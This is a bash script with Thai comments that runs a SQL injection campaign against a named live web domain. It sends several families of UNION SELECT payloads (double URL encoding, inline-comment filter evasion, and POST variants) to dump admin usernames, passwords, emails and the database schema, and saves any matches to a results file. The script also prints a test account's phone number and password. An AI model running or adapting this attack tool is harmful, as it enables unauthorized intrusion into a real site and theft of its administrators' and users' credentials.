#!/bin/bash

echo "🎯 FINAL ADMIN DATA EXTRACTION"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
INJECTION_URL="$BASE_URL/public/js/v2/app.js"

echo "🔑 Test User: 0630471054 / laline1812"
echo ""

# สร้างไฟล์บันทึกผลลัพธ์
RESULTS_FILE="admin_extraction_results_$(date +%Y%m%d_%H%M%S).txt"
echo "📄 บันทึกผลลัพธ์ใน: $RESULTS_FILE"

# 1. ดึงข้อมูล Admin จาก Double URL Encoding
echo "🔓 ดึงข้อมูล Admin จาก Double URL Encoding..."
echo "🔓 ดึงข้อมูล Admin จาก Double URL Encoding..." >> "$RESULTS_FILE"

ADMIN_PAYLOADS=(
    "25.1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520users%2520WHERE%2520role%253D%2527admin%2527--"
    "25.1%2527%2520UNION%2520SELECT%2520id,username,password%2520FROM%2520users%2520WHERE%2520username%2520LIKE%2520%2527admin%2525%2527--"
    "25.1%2527%2520UNION%2520SELECT%2520email,password,role%2520FROM%2520users%2520WHERE%2520email%2520LIKE%2520%2527%2525admin%2525%2527--"
    "25.1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520admins--"
    "25.1%2527%2520UNION%2520SELECT%2520id,username,password%2520FROM%2520admin_users--"
)

for i in "${!ADMIN_PAYLOADS[@]}"; do
    payload="${ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Admin Payload $((i+1))..."
    echo "  📊 ทดสอบ Admin Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 2. ดึงข้อมูล Database Schema
echo "🗄️ ดึงข้อมูล Database Schema..."
echo "🗄️ ดึงข้อมูล Database Schema..." >> "$RESULTS_FILE"

SCHEMA_PAYLOADS=(
    "25.1%2527%2520UNION%2520SELECT%2520table_name,null,null%2520FROM%2520information_schema.tables%2520WHERE%2520table_schema%253Ddatabase()--"
    "25.1'/**/UNION/**/SELECT/**/column_name,null,null/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'--"
    "25.1'/**/UNION/**/SELECT/**/column_name,null,null/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='admins'--"
    "25.1'/**/UNION/**/SELECT/**/table_name,column_name,null/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=database()--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Schema Payload $((i+1))..."
    echo "  📊 ทดสอบ Schema Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"users"* ]] || [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    🔍 Schema ที่พบ:"
            echo "    🔍 Schema ที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 3. ดึงข้อมูล Admin จาก Comment Bypass
echo "🔓 ดึงข้อมูล Admin จาก Comment Bypass..."
echo "🔓 ดึงข้อมูล Admin จาก Comment Bypass..." >> "$RESULTS_FILE"

COMMENT_ADMIN_PAYLOADS=(
    "25.1'/**/UNION/**/SELECT/**/username,password,email/**/FROM/**/users/**/WHERE/**/role='admin'--"
    "25.1'/*!UNION*//*!SELECT*//*!username,password,email*//*!FROM*//*!users*//*!WHERE*//*!role='admin'*/--"
    "25.1'/**/UNION/**/SELECT/**/id,username,password/**/FROM/**/users/**/WHERE/**/username/**/LIKE/**/'admin%'--"
    "25.1'/**/UNION/**/SELECT/**/email,password,role/**/FROM/**/users/**/WHERE/**/email/**/LIKE/**/'%admin%'--"
    "25.1'/**/UNION/**/SELECT/**/username,password,email/**/FROM/**/admins--"
)

for i in "${!COMMENT_ADMIN_PAYLOADS[@]}"; do
    payload="${COMMENT_ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Comment Admin Payload $((i+1))..."
    echo "  📊 ทดสอบ Comment Admin Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 4. ดึงข้อมูล Admin จาก HTTP Method Bypass
echo "🔓 ดึงข้อมูล Admin จาก HTTP Method Bypass..."
echo "🔓 ดึงข้อมูล Admin จาก HTTP Method Bypass..." >> "$RESULTS_FILE"

POST_ADMIN_PAYLOADS=(
    "25.1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "25.1' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "25.1' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "25.1' UNION SELECT username,password,email FROM admins--"
    "25.1' UNION SELECT id,username,password FROM admin_users--"
)

for i in "${!POST_ADMIN_PAYLOADS[@]}"; do
    payload="${POST_ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ POST Admin Payload $((i+1))..."
    echo "  📊 ทดสอบ POST Admin Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$INJECTION_URL" \
        -d "v=$payload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 5. สรุปผลลัพธ์
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin:"
echo "  🔓 Double URL Encoding: ✅ ดำเนินการแล้ว"
echo "  🔓 Comment Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 HTTP Method Bypass: ✅ ดำเนินการแล้ว"
echo "  🗄️ Database Schema: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้"

echo "==================================================" >> "$RESULTS_FILE"
echo "📊 สรุปผลการดึงข้อมูล Admin:" >> "$RESULTS_FILE"
echo "  🔓 Double URL Encoding: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 Comment Bypass: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 HTTP Method Bypass: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🗄️ Database Schema: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "" >> "$RESULTS_FILE"
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE" >> "$RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้" >> "$RESULTS_FILE"

echo ""
echo "🎯 การทดสอบเสร็จสิ้น! ตรวจสอบไฟล์ $RESULTS_FILE"